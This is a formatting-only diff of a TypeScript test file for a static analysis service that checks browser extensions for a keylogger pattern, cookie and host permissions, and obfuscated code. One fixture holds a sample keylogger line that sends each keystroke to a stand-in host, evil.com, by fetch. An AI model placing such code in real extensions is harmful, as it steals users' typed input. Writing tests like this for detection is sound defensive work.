@@ -3,7 +3,11 @@ import { StaticAnalysisService } from '../static-analysis.service.js';
 import { AstParserService } from '../ast-parser/ast-parser.service.js';
 import { DomainDiscoveryService } from '../domain-discovery/domain-discovery.service.js';
 import { StructuredLogger } from '../../common/logger/logger.service.js';
-import type { PreprocessorOutput, ProcessedFile, ManifestInfo } from '../../common/interfaces/analysis.interfaces.js';
+import type {
+  PreprocessorOutput,
+  ProcessedFile,
+  ManifestInfo,
+} from '../../common/interfaces/analysis.interfaces.js';
 
 // ─── Test helpers ─────────────────────────────────────────────────────────────
 
@@ -21,7 +25,9 @@ function makeManifest(overrides: Partial<ManifestInfo> = {}): ManifestInfo {
   };
 }
 
-function makeFile(overrides: Partial<ProcessedFile> & { path: string }): ProcessedFile {
+function makeFile(
+  overrides: Partial<ProcessedFile> & { path: string },
+): ProcessedFile {
   return {
     role: 'content_script',
     isObfuscated: false,
@@ -74,16 +80,20 @@ describe('StaticAnalysisService', () => {
 
   describe('analyze', () => {
     it('should detect keylogger pattern in a content_script file', async () => {
-      const preprocessed = makePreprocessed([
-        makeFile({
-          path: 'content.js',
-          role: 'content_script',
-          cleanCode: `document.addEventListener('keyup', function(e) { fetch('https://evil.com/k?k=' + e.key); });`,
-          usesFetch: true,
-          urls: ['https://evil.com/'],
-          domains: [{ domain: 'evil.com', line: 1 }],
-        }),
-      ], {}, 'hash123');
+      const preprocessed = makePreprocessed(
+        [
+          makeFile({
+            path: 'content.js',
+            role: 'content_script',
+            cleanCode: `document.addEventListener('keyup', function(e) { fetch('https://evil.com/k?k=' + e.key); });`,
+            usesFetch: true,
+            urls: ['https://evil.com/'],
+            domains: [{ domain: 'evil.com', line: 1 }],
+          }),
+        ],
+        {},
+        'hash123',
+      );
 
       const result = await service.analyze(preprocessed, 'job-1');
 
@@ -93,12 +103,23 @@ describe('StaticAnalysisService', () => {
 
     it('should surface api and host permissions from preprocessor manifest', async () => {
       const preprocessed = makePreprocessed(
-        [makeFile({ path: 'bg.js', role: 'background', cleanCode: 'console.log("ok");' })],
+        [
+          makeFile({
+            path: 'bg.js',
+            role: 'background',
+            cleanCode: 'console.log("ok");',
+          }),
+        ],
         {
           apiPermissions: ['cookies', 'storage', 'tabs'],
           hostPermissions: ['https://google.com/*', 'https://facebook.com/*'],
           rawManifest: {
-            permissions: ['cookies', 'storage', 'tabs', 'https://facebook.com/*'],
+            permissions: [
+              'cookies',
+              'storage',
+              'tabs',
+              'https://facebook.com/*',
+            ],
             host_permissions: ['https://google.com/*'],
           },
         },
@@ -107,20 +128,36 @@ describe('StaticAnalysisService', () => {
 
       const result = await service.analyze(preprocessed, 'job-2');
 
-      expect(result.manifestPermissions).toEqual(['cookies', 'storage', 'tabs']);
+      expect(result.manifestPermissions).toEqual([
+        'cookies',
+        'storage',
+        'tabs',
+      ]);
       expect(result.manifestHostPermissions).toContain('https://google.com/*');
-      expect(result.manifestHostPermissions).toContain('https://facebook.com/*');
+      expect(result.manifestHostPermissions).toContain(
+        'https://facebook.com/*',
+      );
     });
 
     it('should report obfuscated files as findings and set obfuscationDetected', async () => {
-      const preprocessed = makePreprocessed([
-        makeFile({ path: 'obf.js', role: 'content_script', isObfuscated: true }),
-      ], {}, 'hash');
+      const preprocessed = makePreprocessed(
+        [
+          makeFile({
+            path: 'obf.js',
+            role: 'content_script',
+            isObfuscated: true,
+          }),
+        ],
+        {},
+        'hash',
+      );
 
       const result = await service.analyze(preprocessed, 'job-3');
 
       expect(result.obfuscationDetected).toBe(true);
-      const obfFinding = result.findings.find((f) => f.pattern === 'obfuscated_code');
+      const obfFinding = result.findings.find(
+        (f) => f.pattern === 'obfuscated_code',
+      );
       expect(obfFinding).toBeDefined();
     });
 
@@ -148,7 +185,9 @@ describe('StaticAnalysisService', () => {
       ]);
 
       const result = await service.analyze(preprocessed, 'job-5');
-      const keyFindings = result.findings.filter((f) => f.pattern.includes('keyup'));
+      const keyFindings = result.findings.filter((f) =>
+        f.pattern.includes('keyup'),
+      );
       expect(keyFindings.length).toBeLessThanOrEqual(1);
     });
 
